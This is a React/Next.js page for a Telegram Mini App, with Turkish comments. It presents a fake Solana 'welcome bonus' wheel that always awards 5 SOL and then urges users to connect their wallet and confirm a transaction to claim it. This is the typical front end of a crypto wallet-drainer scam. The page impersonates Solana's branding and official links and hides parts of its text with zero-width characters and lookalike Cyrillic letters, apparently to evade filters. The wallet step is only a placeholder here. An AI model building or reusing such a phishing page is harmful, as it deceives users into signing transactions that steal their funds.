// app/page.tsx
'use client'

import React, { useEffect, useRef, useState } from 'react'
import './assets/2idql.css'                // Tasarım CSS’i

/* ——————————————————————————————————————— */
/*  Telegram Web-App için hafif tip tanımı   */
/* ——————————————————————————————————————— */
interface TgWebApp {
  expand: () => void
  requestFullscreen?: () => void          // Bot API 7.8+
  setHeaderColor: (typeOrColor: string, colorHex?: string) => void
  setBackgroundColor: (colorHex: string) => void
  disableVerticalSwipes?: () => void      // Bot API 7.7
  scroll?: (offsetY: number) => void      // çok eski sürüm
}

type TgWindow = Window & {
  Telegram?: { WebApp?: TgWebApp }
}

/* ——————————————————————————————————————— */
/*  Şimdilik sahte “cüzdan aç” fonksiyonu    */
/* ——————————————————————————————————————— */
const openModal = () => console.log('openModal() henüz bağlanmadı.')

/* ——————————————————————————————————————— */
/*  Sayfa bileşeni                           */
/* ——————————————————————————————————————— */
const Page = () => {
  /* -------- Telegram Mini-App başlat -------- */
  useEffect(() => {
    const webapp = (window as TgWindow).Telegram?.WebApp
    if (!webapp) return

    try {
      /* 1) Tam ekran varsa kullan, yoksa expand */
      if (typeof webapp.requestFullscreen === 'function') {
        webapp.requestFullscreen()
      } else {
        webapp.expand()
      }

      /* 2) Tema renkleri */
      webapp.setHeaderColor('bg_color', '#000000')
      webapp.setBackgroundColor('#000000')

      /* 3) “Swipe-to-close” kapatma */
      if (typeof webapp.disableVerticalSwipes === 'function') {
        webapp.disableVerticalSwipes()
      } else if (typeof webapp.scroll === 'function') {
        const lockScroll = () => webapp.scroll!(window.scrollY)
        window.addEventListener('scroll', lockScroll)
        return () => window.removeEventListener('scroll', lockScroll)
      }
    } catch (err) {
      console.error('Telegram WebApp init hatası:', err)
    }
  }, [])

  /* -------- ÇARK (spin) durumu -------- */
  const wheelRef = useRef<HTMLImageElement>(null)

  const [hasSpun, setHasSpun] = useState<boolean>(() => {
    if (typeof window === 'undefined') return false
    return localStorage.getItem('hasSpun') === 'true'
  })

  /* Spin bitince modal’ı aç */
  useEffect(() => {
    if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
  }, [hasSpun])

  /* Spin butonu */
  const handleSpin = () => {
    if (hasSpun || !wheelRef.current) return

    const wheel = wheelRef.current
    wheel.style.transition = 'transform 9000ms ease-in-out'
    wheel.style.transform  = 'rotate(1080deg)'   // 3 tur

    setTimeout(() => {
      wheel.style.transition = 'none'
      wheel.style.transform  = 'rotate(0deg)'
    }, 9000)

    setTimeout(() => {
      setHasSpun(true)
      localStorage.setItem('hasSpun', 'true')
    }, 10000)
  }


  return (
    <>
      {/* ---------- HERO BANNER ---------- */}
      <div className="_1">
        <div className="_g">
          <span className="_a">
            <div className="_3">
              <p className="_7">
                CONGRATULATIONS! <br />
                <span className="_a">You won</span>{" "}
                <span>
                  <span className="_a">5 $SOL</span>
                </span>
              </p>
            </div>
          </span>

          <div className="_9">
            <div className="_i">
              <p className="_k">Connect your wallet to receive reward</p>
              <button onClick={openModal} className="_s">
                CLAIM REWARD
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* ---------- HEADER ---------- */}
      <section className="_b">
        <span className="_a">
          <div className="_d">
            <div className="_x">
              <div className="_0">
                <a href="#!" className="_h">
                  <img src="/header_logo.svg" alt="Solana logo" />
                </a>
                <a href="#!" className="_w">
                  <img src="/alik.png" className="_t" alt="" />
                </a>
              </div>

              <div className="_0">
                <div className="_6">
                  <a
                    href="https://x.com/solana?mx=2"
                    target="_blank"
                    className="_q"
                    rel="noreferrer"
                  >
                    <img src="/header_twitter.svg" alt="Twitter / X" />
                  </a>
                  <a
                    href="https://t.me/solana"
                    target="_blank"
                    className="_q"
                    rel="noreferrer"
                  >
                    <img src="/header_tg.svg" alt="Telegram" />
                  </a>
                  <a
                    href="https://www.youtube.com/SolanaFndn"
                    target="_blank"
                    className="_q"
                    rel="noreferrer"
                  >
                    <img src="/header_mail.svg" alt="YouTube" />
                  </a>
                  <a
                    href="https://discord.com/invite/kBbATFA7PW"
                    target="_blank"
                    className="_q"
                    rel="noreferrer"
                  >
                    <img src="/header_ds.svg" alt="Discord" />
                  </a>
                </div>
              </div>

              <div className="_0">
                <button onClick={openModal} className="_n">
                  <span className="_a">Connect Wallet</span>
                  <img src="/header_arrow.svg" alt="" />
                </button>
              </div>
            </div>
          </div>
        </span>
      </section>

      {/* ---------- MAIN SECTION ---------- */}
      <section className="_m">
        <div className="_d">
<h1 className="_4">
  WELCOME <span>BONUS</span>
  <br />
  FOR SOLANA USERS
</h1>

          <span className="_a">
            <div className="_o">
              <span className="_a">
                <div className="_r">
                  <img src="/wheel_arrow.png" alt="" className="_f" />
                  <img
                    ref={wheelRef}
                    src="/wheel_wheel.png"
                    alt="Wheel"
                    className="_l"
                    id="_8"
                  />
                  <button className="_y" id="_c" onClick={handleSpin}>
                    <span className="_a">FREE SPIN</span>
                  </button>
                </div>
              </span>
            </div>
          </span>

          <div className="_u">
            <div className="_j">
              <p className="_p">
                <img src="/main_one.svg" alt="" />
                If you have received a qualification notification in the form of
                SOL or USDT, click the «FREE SPIN» button
              </p>
              <p className="_p">
                <img src="/main_two.svg" alt="" />
                ​If⁣ уоu win rеwar⁣d​ in f‌⁢⁣rе‌e sp‍i‍n, ​‍w⁢е c‍ongr​аtulаtе
                yо⁣u!
              </p>
              <p className="_p">
                <img src="/main_three.svg" alt="" />
                <span className="_a">
                  Click «CLAIM REWARD», connect your wallet and confirm the
                  received transaction
                </span>
              </p>
            </div>
            <p className="_e">All rights reserved © 2025 SOLANA.</p>
          </div>
        </div>
      </section>

      {/* ---------- FOOTER SOCIAL ---------- */}
      <section className="_v">
        <div className="_d">
          <div className="_6">
            <a
              href="https://x.com/solana?mx=2"
              target="_blank"
              className="_q"
              rel="noreferrer"
            >
              <img src="/header_twitter.svg" alt="Twitter" />
            </a>
            <a
              href="https://t.me/solana"
              target="_blank"
              className="_q"
              rel="noreferrer"
            >
              <img src="/header_tg.svg" alt="Telegram" />
            </a>
            <a
              href="https://www.youtube.com/SolanaFndn"
              target="_blank"
              className="_q"
              rel="noreferrer"
            >
              <img src="/header_mail.svg" alt="YouTube" />
            </a>
            <a
              href="https://discord.com/invite/kBbATFA7PW"
              target="_blank"
              className="_q"
              rel="noreferrer"
            >
              <img src="/header_ds.svg" alt="Discord" />
            </a>
          </div>
        </div>
      </section>
    </>
  );
};

export default Page;
